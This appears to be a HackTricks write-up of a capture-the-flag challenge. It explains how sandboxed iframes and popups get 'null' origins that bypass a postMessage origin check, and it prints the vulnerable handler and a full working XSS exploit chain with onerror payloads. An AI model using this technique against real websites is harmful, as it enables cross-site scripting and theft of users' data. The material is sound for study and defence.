# Bypassing SOP with Iframes - 1

{{#include ../../banners/hacktricks-training.md}}

## Iframes in SOP-1

This challenge by NDevTK and Terjanq requires exploiting an XSS in the following message handler; the original creator profiles are retained for attribution.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

```javascript
const identifier = "4a600cd2d4f9aa1cfb5aa786"
onmessage = (e) => {
  const data = e.data
  if (e.origin !== window.origin && data.identifier !== identifier) return
  if (data.type === "render") {
    renderContainer.innerHTML = data.body
  }
}
```

The main page sanitizes its normal `data.body` flow with DOMPurify. To send attacker-controlled HTML to this handler, the challenge requires bypassing the `e.origin !== window.origin` check.

Let's see the solution they propose.<sup>[[1]](#references)</sup>

### SOP bypass 1 (e.origin === null)

When a document is embedded in an iframe whose sandbox flags omit `allow-same-origin`, it receives an opaque origin. Its serialized origin in messaging is `null`, so `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` can force the condition used by this challenge.<sup>[[2]](#references)</sup>

If the page was **embeddable** you could bypass that protection that way (cookies might also need to be set to `SameSite=None`).

### SOP bypass 2 (window.origin === null)

When **`allow-popups`** is set, an opened popup inherits the sandbox restrictions unless `allow-popups-to-escape-sandbox` is also set. Opening the popup from this opaque-origin iframe therefore leaves the popup sandboxed with an opaque origin too.<sup>[[2]](#references)</sup>

### Challenge Solution

For this challenge, create the sandboxed iframe and use it to open `/iframe.php` in a popup. Because both compared origin strings are `null`, the attacker can send a payload that reaches the unsafe `innerHTML` assignment.

The first XSS obtains `identifier` and sends a second XSS payload back to the top page, which navigates to `/iframe.php`. For the second delivery, knowing `identifier` makes `data.identifier === identifier` true and satisfies the alternate side of the flawed check even though the sender origin no longer matches. The XSS then executes in the target origin. The complete payload and timing are retained below.<sup>[[1]](#references)</sup>

```html
<body>
  <script>
    f = document.createElement("iframe")

    // Needed flags
    f.sandbox = "allow-scripts allow-popups allow-top-navigation"

    // Second communication with /iframe.php (this is the top page relocated)
    // This will execute the alert in the correct origin
    const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
      x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
    },1000);`.replaceAll("\n", " ")

    // Initial communication
    // Open /iframe.php in a popup, both iframes and popup will have "null" as origin
    // Then, bypass window.origin === e.origin to steal the identifier and communicate
    // with the top with the second XSS payload
    f.srcdoc = `
    <h1>Click me!</h1>
    <script>
      onclick = e => {
        let w = open('https://so-xss.terjanq.me/iframe.php');
        onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
        setTimeout(_ => {
          w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
        }, 1000);
      };
    <\/script>
    `
    document.body.appendChild(f)
  </script>
</body>
```

## References

- [1] [soXSS - writeup](https://github.com/terjanq/same-origin-xss)
- [2] [WHATWG HTML - sandboxed origin and popup sandboxing flags](https://html.spec.whatwg.org/multipage/origin.html#sandboxing-flag-set)
- [3] [NDevTK](https://github.com/NDevTK)
- [4] [Terjanq](https://github.com/terjanq)

{{#include ../../banners/hacktricks-training.md}}
